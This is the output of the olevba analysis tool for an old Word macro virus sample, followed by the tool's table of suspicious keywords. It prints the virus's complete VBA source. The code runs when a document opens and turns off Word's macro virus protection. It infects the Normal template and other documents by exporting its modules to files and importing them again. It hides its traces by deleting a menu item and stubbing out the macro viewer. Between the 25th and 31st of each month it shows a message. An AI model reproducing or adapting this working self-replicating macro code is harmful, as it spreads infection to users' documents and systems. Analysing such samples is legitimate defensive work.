olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.bx-74ea9c5e1619e06e429453763eb7eb2617032546
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.bx-74ea9c5e1619e06e429453763eb7eb2617032546 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
AM.UserForm_Click
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
Select Case Day(Now)
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
Case 25 To 31
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
AM.Show
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
End Select
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
End Sub

Sub ViewVBCode()

End Sub

Sub ToolsMacro()

End Sub
-------------------------------------------------------------------------------
VBA MACRO AM.frm 
in file: Virus.MSWord.Class.bx-74ea9c5e1619e06e429453763eb7eb2617032546 - OLE stream: 'Macros/VBA/AM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
Sub UserForm_Click()
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
On Error GoTo out
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
Options.VirusProtection = False
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
Options.SaveNormalPrompt = False
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
Options.ConfirmConversions = False
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.countoflines
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.countoflines
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
If nt > 0 And ad > 0 Then GoTo out
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
If nt = 0 Then
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
    Set infect = NormalTemplate.VBProject.VBComponents
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
    Set host = ActiveDocument.VBProject.VBComponents
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
    host.Item(1).codemodule.replaceline 3, Application.UserInitials & ".UserForm_Click"
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
    host.Item(1).codemodule.replaceline 5, "select case day(now)"
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
    host.Item(1).codemodule.replaceline 7, "case 25 to 31"
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
    host.Item(1).codemodule.replaceline 9, Application.UserInitials & ".show"
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
    host.Item(1).codemodule.replaceline 11, "end select"
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
    host.Item(1).Name = infect.Item(1).Name
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
    host.Item(2).Name = Application.UserInitials
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
    host.Item(1).Export "c:\kernel.sys"
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
    host.Item(2).Export "c:\kernel2.sys"
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
End If
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
If ad = 0 Then Set infect = ActiveDocument.VBProject.VBComponents
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
infect.Import ("c:\kernel2.sys")
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
infect.Item(1).codemodule.AddFromFile ("c:\kernel.sys")
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
With infect.Item(1).codemodule
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
    For x = 1 To 4
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
    .deletelines 1
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
    Next x
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
    If nt = 0 Then
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
    .insertlines 14, vbCr & "Sub ViewVBCode()"
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
    .insertlines 16, vbCr & "End Sub"
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
    .insertlines 18, vbCr & "Sub ToolsMacro()"
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
    .insertlines 20, vbCr & "End Sub"
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
    CommandBars("tools").Controls("Templates and add-ins...").Delete
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
    End If
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
End With
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
If nt = 0 Then infect.Item(1).codemodule.replaceline 1, "Sub AutoClose()"
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
If nt = 0 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
With infect.Item(2).codemodule
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
    .deletelines 1
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
    For x = 1 To infect.Item(2).codemodule.countoflines Step 2
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
    Next x
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
End With
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
With infect.Item(1).codemodule
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
    For x = 2 To infect.Item(1).codemodule.countoflines Step 2
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
    Next x
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
End With
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
out:
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
If nt <> 0 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc
End Sub
'Virus Lab2/26/99 3:48:30 PMBrother HL-8V on \\DEATH_WAGON\VIRLAB1diva230.doc

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-74ea9c5e1619e06e429453763eb7eb2617032546' - OLE stream: 'Macros/AM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�DiWa�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-74ea9c5e1619e06e429453763eb7eb2617032546' - OLE stream: 'Macros/AM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-74ea9c5e1619e06e429453763eb7eb2617032546' - OLE stream: 'Macros/AM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-=-=-=-=-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-74ea9c5e1619e06e429453763eb7eb2617032546' - OLE stream: 'Macros/AM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-74ea9c5e1619e06e429453763eb7eb2617032546' - OLE stream: 'Macros/AM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�This message was dedicated 2 all my friends, who have good skill but terminated from their company, and become joblessE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-74ea9c5e1619e06e429453763eb7eb2617032546' - OLE stream: 'Macros/AM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-74ea9c5e1619e06e429453763eb7eb2617032546' - OLE stream: 'Macros/AM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�You Will Be MissedB
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-74ea9c5e1619e06e429453763eb7eb2617032546' - OLE stream: 'Macros/AM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-74ea9c5e1619e06e429453763eb7eb2617032546' - OLE stream: 'Macros/AM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Keep your good working guys, We appreciated with all you have done, good luck and success 4 U�E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-74ea9c5e1619e06e429453763eb7eb2617032546' - OLE stream: 'Macros/AM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Class.bx-74ea9c5e1619e06e429453763eb7eb2617032546' - OLE stream: 'Macros/AM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Class.bx-74ea9c5e1619e06e429453763eb7eb2617032546' - OLE stream: 'Macros/AM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Class.bx-74ea9c5e1619e06e429453763eb7eb2617032546' - OLE stream: 'Macros/AM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label8'" IN 'Virus.MSWord.Class.bx-74ea9c5e1619e06e429453763eb7eb2617032546' - OLE stream: 'Macros/AM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label9'" IN 'Virus.MSWord.Class.bx-74ea9c5e1619e06e429453763eb7eb2617032546' - OLE stream: 'Macros/AM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label11'" IN 'Virus.MSWord.Class.bx-74ea9c5e1619e06e429453763eb7eb2617032546' - OLE stream: 'Macros/AM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label12'" IN 'Virus.MSWord.Class.bx-74ea9c5e1619e06e429453763eb7eb2617032546' - OLE stream: 'Macros/AM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |UserForm_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

